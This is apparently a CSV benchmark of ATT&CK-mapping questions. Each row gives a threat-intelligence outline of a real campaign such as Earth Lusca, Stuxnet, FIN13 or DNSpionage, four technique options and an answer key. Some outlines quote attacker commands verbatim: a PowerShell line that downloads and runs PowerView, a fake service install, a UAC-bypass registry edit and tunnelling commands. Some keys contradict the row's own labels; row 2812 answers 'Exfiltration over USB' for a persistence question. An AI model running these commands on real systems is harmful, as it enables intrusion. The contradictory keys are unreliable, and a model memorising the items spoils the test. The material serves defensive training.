Question ID,AttackSeq ID,Batch ID,Question,A,B,C,D,CTI Outline,Answer
1191,25,25-Command and Control-T1071-Application Layer Protocol,"After utilizing the RMS tool's capabilities to evade detection through legitimate application functions, which ATT&CK technique most likely occurred when the RMS executable established communication with a C2 server located in Germany?",T1204-User Execution,T1568.001-Fast Flux DNS,T1071-Application Layer Protocol,T1071.001-Web Protocols,"Initial Access: CyberInt researchers have been tracking activities following a spear-phishing campaign targeting US-based retailers since December 2018. The campaign leveraged a legitimate remote administration tool, 'Remote Manipulator System' (RMS), developed by TektonIT, to gain entry into networks and evade security controls. The phishing emails contained malicious MS Office documents and used social engineering tactics.
Execution: The malicious MS Office documents delivered via phishing emails instructed victims to disable security controls to allow a nefarious macro to execute. This macro would then attempt to download malicious payloads from the threat actor's C2 infrastructure, which often masqueraded as legitimate-looking domains. The initial payload was typically a robust malware downloader used to gather further components, including the RMS tool, supporting shell scripts, and configuration files.
Persistence: For persistence, the second-stage shell script added a 'Microtik' string value to the 'HKEY_CURRENT_USERS' hive, 'Windows\CurrentVersion\Run' key to launch the RMS executable whenever the user logged on. Additionally, the RMS executable was launched before the script tried to forcefully kill the 'rundll32.exe' process, causing the script to go into a loop.
Defense Evasion: The threat actors utilized the RMS tool's capabilities to conduct reconnaissance and lateral movement within a victim network. The use of legitimate remote administration tools allowed threat actors to directly perform malicious activities as well as leverage the tool's capabilities to avoid detection.
Others: The sophisticated threat actor group dubbed 'TA505' has been active since 2014, conducting high-volume malicious email campaigns, including the distribution of banking trojans, botnets, exploit kits, and ransomware. TA505's recent campaigns have included the use of RMS in attacks against US-based retailers and the financial industry. Indicators of compromise identified in the US retail campaign were consistent with an attack against the Notary Chamber of Ukraine, also during December 2018. The accessibility and simplicity of using RMS for nefarious purposes likely explain the prevalence of the tool in unrelated malicious campaigns.",C
2220,376,376-Exfiltration-T1041-Exfiltration Over C2 Channel,"After the group collected data using WinRAR to compress files into an archive, which ATT&CK technique most likely occurred as they used the C2 channels for transferring the stolen data out of the victim network?",T1590-Gather Victim Network Information,T1556.008-Network Provider DLL,T1041-Exfiltration Over C2 Channel,T1567.002-Exfiltration to Cloud Storage,"Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.",D
683,185,185-Command and Control-T1071-Application Layer Protocol,"After achieving lateral movement by exploiting vulnerabilities like MS08-067 and MS10-061 to propagate within networks, which ATT&CK technique most likely occurred to send data and receive commands or updates from predefined URLs?",T1608.002-Upload Tool,T1553-Subvert Trust Controls,T1071-Application Layer Protocol,T1001.003-Protocol or Service Impersonation,"Initial Access: The Stuxnet worm exploited the CVE-2010-2568 vulnerability to gain initial access to systems. This vulnerability was related to the way Windows displayed shortcut icons. Stuxnet used malicious .LNK files that, when viewed, would automatically execute the malware without user interaction. The worm specifically targeted SCADA systems, but its propagation method allowed it to spread widely. The initial infection vector was through removable drives, such as USB flash drives, which contained the malicious .LNK files and two TMP files (~WTR4141.TMP and ~WTR4132.TMP). The .LNK files were crafted to load the ~WTR4141.TMP file, which in turn would load and execute the ~WTR4132.TMP file, leading to the infection of the host machine.
Execution: Stuxnet's execution phase involved running malicious code on both local and remote systems. The worm's main module, a DLL packed with UPX, contained multiple resources including two kernel-mode drivers (MrxCls.sys and MrxNet.sys) and additional user-mode components. These drivers were responsible for injecting code into processes and hiding files used for propagation. Stuxnet also replaced legitimate system files with malicious versions to maintain persistence and control over infected systems. The malware executed exported functions from its main module to perform various tasks, such as building and running its dropper, spreading through the network, and communicating with command and control (C&C) servers.
Persistence: Stuxnet achieved persistence by installing kernel-mode drivers and user-mode components onto infected systems. It used a boot start service to ensure its kernel-mode driver (MrxCls.sys) was loaded early in the OS boot process. The driver injected code into specific processes and monitored system behavior to maintain control. Additionally, Stuxnet modified system files and registry keys to ensure it was executed upon system startup.
Privilege Escalation: Stuxnet utilized two zero-day vulnerabilities, MS10-073 and MS10-092, to escalate privileges on infected systems. The MS10-073 vulnerability in the win32k.sys system module allowed Stuxnet to execute arbitrary code with SYSTEM privileges by loading a specially crafted keyboard layout file. The MS10-092 vulnerability in the Windows Task Scheduler Service enabled Stuxnet to elevate its privileges up to SYSTEM level by manipulating the metadata of scheduled tasks. The worm used these elevated privileges to perform actions that would otherwise be restricted.
Defense Evasion: Stuxnet employed multiple techniques to evade detection and analysis. It used rootkit functionality to hide its presence on infected systems, including hiding files and injecting code into processes. The worm also utilized stolen digital certificates to sign its kernel-mode drivers, making them appear as legitimate software components. Additionally, Stuxnet patched system libraries and hooked functions to load non-existent libraries, reducing the likelihood of detection by heuristic methods.
Lateral Movement: Stuxnet propagated laterally through networks by exploiting vulnerabilities and shared resources. It used the MS08-067 RPC vulnerability and the MS10-061 Print Spooler vulnerability to spread itself across networked machines. The worm also scanned network shares and installed its dropper on accessible systems. Stuxnet's lateral movement capabilities allowed it to infect multiple systems within a targeted network, increasing its reach and impact.",C
568,172,172-Collection-T1113-Screen Capture,"After the malware collected basic information like IP address, hostname, and Bitcoin wallet addresses during the Discovery phase, which ATT&CK technique most likely occurred to gather screen recording files in the Collection phase?",T1036.006-Space after Filename,T1113-Screen Capture,T1012-Query Registry,T1213.005-Messaging Applications,"Initial Access: In July 2019, an APT attack targeted a customer's company, leading to the discovery of a new backdoor malware that uses Dropbox API for command and control (C&C) activities. The threat actor loaded a malicious DLL by leveraging the legitimate Windows Defender Core Process (MsMpEng.exe) with a legal digital signature. The infection process involved different loader filenames placed in C:\ProgramData\Microsoft, which called the function ServiceCrtMain from mpsvc.dll. The older variant of mpsvc.dll read shellcode from an English.rtf payload file, while the newer variant had hardcoded shellcode that would inject and execute to load additional shellcode from mpsvc.mui, ultimately releasing a fully functional backdoor executable.
Execution: The final malicious executable, released by the newer type of mpsvc.dll, had upgraded features, including the ability to interact with Dropbox API. It could bypass User Account Control (UAC) using a .NET technique disclosed in 2017 and had persistence mechanisms, either by registering as a startup program or as a system service.
Persistence: The malware ensured persistence by registering as a startup program in the registry path HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run if it lacked privileges, or as a system service if it had higher privileges.
Defense Evasion: The malware employed a UAC bypass technique using .NET, which was not new but had been disclosed in 2017. The threat actor only changed the GUID to evade detection.
Discovery: The malware collected basic information such as IP address, hostname, username, OS version, and searched for Bitcoin wallet addresses in the registry key HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt. This information was uploaded to Dropbox with a log file named with the format %Y-%m-%d %H-%M-%S.log.
Command and Control: The malware could connect to a specific C&C server and send back data using fake HTTP POST requests. It also interacted with Dropbox, uploading and downloading files using the Dropbox API. The malware checked for a fake GIF file header in the bin.asc file downloaded from Dropbox before proceeding to a custom decoding phase to release the inject payload.
Others: The investigation revealed that the Dropbox API token was hardcoded in the malware. The Dropbox folder structure included a unique hash for each infected victim, log files, and payload files such as bin.asc. The malware's second stage involved establishing a connection to the C&C server and Dropbox, with Dropbox becoming a secondary C&C server with full remote control features if the primary C&C server's IP address was blocked. The malware could execute various commands, including listing drives, managing files, and opening terminals. The threat actor's approximate working hours were inferred from the decoded command files. Monitoring of the Dropbox tokens showed nearly 200 infected computers at the peak, with a drop in activity on August 21, 2019, when the threat actor cleared the Dropbox folder. The monitoring ended on September 20, 2019, when all tokens were revoked by the threat actor.",B
2189,376,376-Initial Access-T1189-Drive-by Compromise,"After utilizing reconnaissance tools like adfind and PowerSploit to gather domain information, which ATT&CK technique most likely occurred before Earth Lusca executed malicious binaries using command and scripting interpreters?",T1039-Data from Network Shared Drive,T1566-Phishing,T1027.007-Dynamic API Resolution,T1189-Drive-by Compromise,"Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",D
345,146,146-Execution-T1072-Software Deployment Tools,Which ATT&CK technique most likely followed after UNC2452 gained Initial Access via a compromised software supply chain to execute malicious code within the SolarWinds Orion platform?,T1569-System Services,T1583-Acquire Infrastructure,T1072-Software Deployment Tools,T1574.001-DLL Search Order Hijacking,"Reconnaissance: The report does not provide explicit details on the Reconnaissance tactics used by the threat actors involved in the SolarWinds Orion platform compromise. However, it mentions that the attackers demonstrated an impressive degree of reconnaissance and focus, suggesting that they had intimate knowledge of SolarWinds' source code, network topology, and internal development domain names. This knowledge was used to minimize the risk of detection by vigilant employees.
Resource Development: The report indicates that the threat actors behind the SolarWinds Orion platform compromise, referred to as UNC2452, demonstrated significant Resource Development capabilities. They were selective in their targeting, choosing specific organizations to pursue while excluding others. The report suggests adding the ATT&CK sub-technique T1583.001 Acquire Infrastructure: Domains to the UNC2452 actor profile, as the actors parked domains for future use. Additionally, the report notes that the attackers may have had access to private web servers and developed malware capabilities.
Initial Access: The report discusses the Initial Access tactic in the context of the SolarWinds Orion platform compromise. It highlights that the attackers used a supply chain compromise, specifically a compromised software update, as their initial access vector. This technique is listed as T1195 Supply Chain Compromise, with the sub-technique T1195.002 Compromise Software Supply Chain.
Persistence: The report does not provide specific details on Persistence techniques used by the threat actors. However, it implies that the attackers were able to maintain their foothold within the compromised networks by being selective in their targeting and careful to avoid detection.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by the threat actors. However, it suggests that the attackers had a high level of system access, which may imply the use of techniques to gain elevated permissions.
Defense Evasion: The report details several Defense Evasion techniques used by the threat actors, including T1070 Indicator Removal on Host, T1036 Masquerading, T1553 Subvert Trust Controls, and T1497 Virtualization/Sandbox Evasion. The attackers took great care to avoid detection by security tools and personnel, demonstrating a high level of sophistication in evading defenses.
Credential Access: The report does not provide specific details on Credential Access techniques used by the threat actors. However, the use of valid accounts (T1078) is mentioned, suggesting that the attackers may have had access to legitimate credentials to facilitate their operations.
Discovery: The report mentions Discovery techniques such as T1057 Process Discovery and T1012 Query Registry, which the threat actors used to gain knowledge about the systems and internal network of the compromised organizations.
Lateral Movement: The report does not provide specific details on Lateral Movement techniques used by the threat actors. However, it suggests that the attackers were able to move through the network to reach their objectives, which may involve the use of techniques to control remote systems.
Collection: The report does not provide specific details on Collection techniques used by the threat actors. However, it mentions that the attackers were focused on information theft and espionage, which implies the use of techniques to gather data relevant to their goals.
Command and Control: The report discusses Command and Control techniques, including T1071 Application Layer Protocol and T1568 Dynamic Resolution, which the threat actors used to communicate with the compromised systems and maintain control over them.
Exfiltration: The report does not provide specific details on Exfiltration techniques used by the threat actors. However, it mentions that the attackers were likely focused on stealing data, which suggests the use of techniques to remove data from the target network.
Impact: The report does not provide specific details on Impact techniques used by the threat actors. However, it suggests that the primary goal of the attackers was espionage rather than destruction, indicating that impact techniques may not have been a focus of this campaign.
Others: The report provides an analysis of the SolarWinds Orion platform compromise, discussing the attribution challenges and the possibility of multiple actors being involved. It highlights the need for further investigation and intelligence analysis to understand the full scope of the campaign and the actors behind it. The report also emphasizes the importance of using frameworks like MITRE ATT&CK for mapping adversary TTPs and improving defensive strategies.",C
1881,337,337-Persistence-T1554-Compromise Client Software Binary,Which ATT&CK technique most likely occurred before FIN13 used trojanized versions of KeePass binaries to establish persistence after executing commands via cmd.exe using the BLUEAGAVE backdoor?,T1098.005-Device Registration,T1134.005-SID-History Injection,T1132-Data Encoding,T1554-Compromise Client Software Binary,"Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",D
1508,294,294-Reconnaissance-T1598-Phishing for Information,Which ATT&CK technique most likely occurred after spear phishing activities targeting the ASEAN region suggested the focus of reconnaissance efforts?,T1595.001-Scanning IP Blocks,T1102-Web Service,T1598-Phishing for Information,T1027-Obfuscated Files or Information,"Initial Access: The spear phishing document exploits CVE-2012-0158 to create a decoy document and a malware dropper named exp1ore.exe, which drops wab.exe and a malicious DLL, wab32res.dll, in the temp folder. The malware, named 'Trojan.APT.Seinup', uses DLL side-loading to load the malicious DLL and installs a copy as msnetrsvw.exe in the Windows directory, registering it as a Windows service for persistence.
Execution: The malware manually loads the malicious DLL into memory, avoiding detection from DLL listings. It contains functions for downloading files, executing or loading libraries, changing sleep duration, and managing interactive sessions.
Persistence: By registering as a Windows service, the malware named 'Trojan.APT.Seinup' ensures its persistence across system reboots.
Defense Evasion: The malware uses Google Docs for redirection to evade callback detection, a technique also found in 'Backdoor.Makadocs'. It employs various cryptographic functions for secure operations and loads malicious code into memory without using Windows 32 API, evading signature-based scanning.
Command and Control: Trojan.APT.Seinup uses Google Docs to protect malicious communication with legitimate SSL, making it difficult to inspect SSL traffic without specialized hardware or analysis of usage patterns. It also employs a custom Base64 map and a salted digital thumbprint for secure callbacks.
Others: The malware uses a zero-skipping XOR encryption technique to prevent statistical methods from recovering the XOR key. It also uses the Mersenne Twister algorithm to generate random intervals for callbacks, making it difficult to detect based on regular network connections. The malware's in-memory-only presence and encrypted or compressed state on disk contribute to its evasion capabilities.",C
2296,384,384-Command and Control-T1071-Application Layer Protocol,"After the DNSpionage campaign executed a reconnaissance phase to exfiltrate user and domain information and prior to intercepting traffic through DNS communication for further instructions, which ATT&CK technique most likely facilitated communication with the C2 server?",T1590-Gather Victim Network Information,T1071.005-Publish/Subscribe Protocols,T1608.002-Upload Tool,T1071-Application Layer Protocol,"Reconnaissance: The DNSpionage campaign involved meticulous reconnaissance, as evidenced by the attackers' understanding of the victims' network infrastructure to remain undetected. They targeted Lebanon and the UAE, focusing on .gov domains and a private Lebanese airline. The attackers likely used spear-phishing via email or social media platforms like LinkedIn to distribute malicious Microsoft Office documents with embedded macros, disguised as job postings on fake websites such as hr-wipro[.]com and hr-suncor[.]com.
Resource Development: The DNSpionage campaign demonstrated resource development by the attackers, who created two fake websites with job postings to compromise targets. They also generated Let's Encrypt certificates for redirected domains during DNS compromises, although it is unclear if these redirections were successful.
Initial Access: Initial access in the DNSpionage campaign was attempted through malicious websites hosting job listings, which redirected to legitimate company sites. The attackers likely distributed malicious Microsoft Office documents via spear-phishing to compromise targets.
Execution: The DNSpionage malware executes in two steps: first, it decodes a PE file encoded with base64 when the document is opened, and second, it renames and executes the file as a scheduled task when the document is closed. This process requires human interaction and is designed to avoid sandbox detection.
Persistence: The DNSpionage malware maintains persistence by creating a scheduled task named 'chromiumupdater v 37.5.0' to execute the dropped binary every minute.
Defense Evasion: The DNSpionage malware employs defense evasion techniques by using password-protected macros in Microsoft Word to prevent victims from accessing the macro code and by using classical string obfuscation to avoid detection.
Discovery: The DNSpionage malware's initial reconnaissance phase involves commands to retrieve the infected user's username, hostname, and domain information, indicating a discovery process to understand the environment.
Impact: The DNS redirection part of the DNSpionage campaign could have a significant impact, as the attackers were able to intercept traffic destined for the redirected hostnames, potentially harvesting email and VPN credentials, and possibly enabling further attacks or blackmail.
Others: The DNSpionage campaign was discovered by Cisco Talos, authored by Warren Mercer and Paul Rascagneres. The campaign targeted Lebanon and the UAE, with no clear connection to other campaigns or actors. The attackers used Windows malware and DNS exfiltration and redirection, with five attacks launched this year, including one recently. The campaign highlights the need for strong endpoint and network protection against advanced actors with significant targets.",D
16,100,100-Defense Evasion-T1656-Impersonation,"During the initial access phase where the attackers employ email-based deception by impersonating the CEO to initiate correspondence, which ATT&CK technique most likely occurs as part of the defense evasion phase to appear legitimate and prevent validation of their claims?",T1055.002-Portable Executable Injection,T1078.004-Cloud Accounts,T1566-Phishing,T1656-Impersonation,"Initial Access: The Israel-based threat group employs a two-stage attack process, with the first stage involving initial email correspondence. They commonly impersonate the CEO of the targeted organization, setting the stage for the attack by claiming the organization is working through the confidential acquisition of another company and requesting assistance with an initial payment. The group uses various tactics to make the emails appear legitimate, such as spoofing the CEO's email address using the real domain if no effective DMARC policy is in place, or updating the sending display name to include the CEO's email address in the display name. The emails are primarily written in English, but some campaigns have been translated into Spanish, French, Italian, and Japanese to fit in with the usual communications of the targeted employee.
Others: The report details the activities of a sophisticated Israel-based threat group responsible for over 350 BEC campaigns since February 2021. The group targets multinational corporations with annual revenues averaging over $10 billion, with employees in at least 61 different countries across six continents. The campaigns follow a cyclical pattern, with 80% of attacks occurring during three periods throughout the year. The group does not target specific industries and prefers larger enterprises. The average amount requested in an attack is $712,000. The group uses real attorneys' identities, often from KPMG, to coordinate payments. The secondary personas referenced are real M&A attorneys based in the UK. The group's unique approach includes requesting large sums of money and transitioning conversations to voice calls via WhatsApp to expedite the process and reduce the paper trail. The report concludes with recommendations for protecting organizations from BEC attacks, emphasizing the need for security solutions that use behavioral AI to understand identity, context, and content.",D
1464,288,288-Command and Control-T1105-Ingress Tool Transfer,"After Tildeb uses encrypted communication with its C&C server via a modified SHA-1 hashing algorithm to establish session keys, which ATT&CK technique most likely occurred before the Command and Control phase to deploy additional tools for malicious activities?",T1078.002-Domain Accounts,T1105-Ingress Tool Transfer,T1070-Indicator Removal,T1104-Multi-Stage Channels,"Execution: The implant, identified as Tildeb, is a 32-bit console Windows executable named clocksvc.exe, which accepts command-line arguments and was compiled on October 3, 2000. It utilizes the MFC library, specifically mfc42.dll, for network communications and is compiled using Microsoft Visual C++ v6.0. Tildeb does not employ obfuscation techniques such as anti-disassembly, anti-debugging features, or encrypted strings. The implant can operate with various command-line arguments to establish communication with its C&C server using a hardcoded IP address and port, or alternative IP/domain and ports provided as arguments. It also has a capability to listen on a TCP socket for incoming connections and can attempt privilege elevation to inject code into a Microsoft Exchange Server process.
Defense Evasion: Tildeb lacks persistence mechanisms and is designed to clean up after itself if it does not receive data from the C&C server or encounters specific failures. It includes a cleanup thread that triggers a cleanup process under certain conditions, such as a lack of communication from the C&C server or failure to create a process. The cleanup process involves closing handles, deleting temporary files, shutting down sockets, and terminating the process.
Others: The implant Tildeb is associated with the moniker 'PATROLWAGON,' which is likely a reference to an unknown exploitation framework or tool. Tildeb's delivery method is not specified, but it may be distributed via lateral movement or other exploitation frameworks with RCE modules targeting Windows NT. The implant's hardcoded IP address contains a formatting error that affects its connectivity on different versions of Windows OS. Tildeb supports various control commands for malicious activities, including file deletion, file upload, directory listing, registry value modification, and code injection into Microsoft Exchange Server processes. It uses mailslots for interprocess communication and has specific routines for injecting code into Exchange Server processes. The implant attempts to exploit an unknown privilege escalation vulnerability in the win32k.sys driver on systems with specific locale settings.",D
2812,80,80-Persistence-T1547-Boot or Logon Autostart Execution,"After using the Hi-Zor RAT's method of double XOR encoding for command and control communication, which ATT&CK technique most likely occurred before it entrenched itself in the registry run key with 'regsvr32.exe' for persistence?",T1052.001-Exfiltration over USB,T1547.010-Port Monitors,T1027-Obfuscated Files or Information,T1547-Boot or Logon Autostart Execution,"Execution: The Hi-Zor RAT, identified in the INOCNATION campaign, executes processes, establishes a reverse shell, manages files, and has upload/download capabilities. It also includes a kill switch/uninstall feature.
Defense Evasion: Hi-Zor RAT uses string-stacking, a technique seen in Etumbot and Ixeshe families, and double XOR encoding for command and control communication. It also uses common applications, such as VPN installers, as decoys, a tactic observed in Sakula.
Command and Control: Hi-Zor RAT sends a victim's Volume Serial Number information in the beacon and communicates over a secure connection (e.g., TLS).
Others: The Fidelis Threat Advisory #1020 provides a detailed analysis of the Hi-Zor RAT, including new indicators and an updated Yara rule for detection. The Hi-Zor RAT is considered a new variant distinct from Sakula based on differences in code, network traffic, string obfuscation, file type, registry entrenchment, and embedded files. The webinar 'Dissecting the Malware Involved in the INOCNATION Campaign' is scheduled to further discuss the investigation.",A
2116,364,364-Resource Development-T1588-Obtain Capabilities,"Before command and control activities were observed using frameworks like Cobalt Strike Team Servers and TrickBot, which ATT&CK technique most likely facilitated the acquisition and preparation of malware and other necessary components for building the malicious infrastructure?",T1098.004-SSH Authorized Keys,T1586.002-Email Accounts,T1588-Obtain Capabilities,T1105-Ingress Tool Transfer,"Initial Access: Before a server can be used maliciously by a threat actor, it must be acquired through compromise or legitimate purchase. The software is then installed, configurations are tuned, SSL certificates are registered, and files are added to the server. The actors access it via panel login, SSH, or RDP, and expose the malware controller on a port to allow data transfer from the victim and to administer commands to infections.
Command and Control: Recorded Future observed over 10,000 unique C2 servers in 2021, with Cobalt Strike Team Servers and botnet families applying more resiliency and stealth measures. The most commonly observed C2 families were Cobalt Strike Team Servers, Meterpreter, Metasploit, QakBot, and TrickBot. The study also noted that 25% of detected servers were not referenced in open sources and were only identified on the Recorded Future Command and Control source. An average of a 35-day lead time was observed between when a C2 server is detected by scanning efforts and when it is reported in other sources.
Others: Recorded Future anticipates further insulation and modification of C2 servers in 2022 to avoid detection. TrickBot operators have hardened their infrastructure, and similar methods are expected to be employed by Cobalt Strike users. The C2 environment is expected to diversify, with new malware families and C2 frameworks likely to be aware of threat intelligence measures. Mitigations include using the Recorded Future Platform to identify actively exploited vulnerabilities, keeping systems and software up to date, implementing multi-factor authentication for remote access services, password-protecting sensitive files, and employing detection-in-depth methodologies.",C
1960,345,345-Initial Access-T1078-Valid Accounts,"After using exported saved passwords from users' Chrome browser installations for Credential Access, which ATT&CK technique most likely occurred before StellarParticle demonstrated persistence using credential hopping and creating new O365 Service Principals?",T1136-Create Account,T1078.002-Domain Accounts,T1560.002-Archive via Library,T1078-Valid Accounts,"Persistence: The StellarParticle campaign demonstrated persistence by using credential hopping, where different credentials were leveraged for each step while moving laterally through the victim's network. They also used accounts with Delegated Administrator rights to access other O365 tenants and create persistence within the environment. TrailBlazer malware was configured for WMI persistence, and GoldMax malware was configured for persistence via a crontab entry. The threat actor added credentials to O365 Service Principals and created new O365 Service Principals to maintain access to victim's environments.
Defense Evasion: The StellarParticle campaign involved defense evasion techniques such as stealing browser cookies to bypass multifactor authentication (MFA) and using renamed utilities to masquerade as legitimate system binaries. They also renamed their systems prior to connecting to victim's VPNs to match the victim's system naming convention.
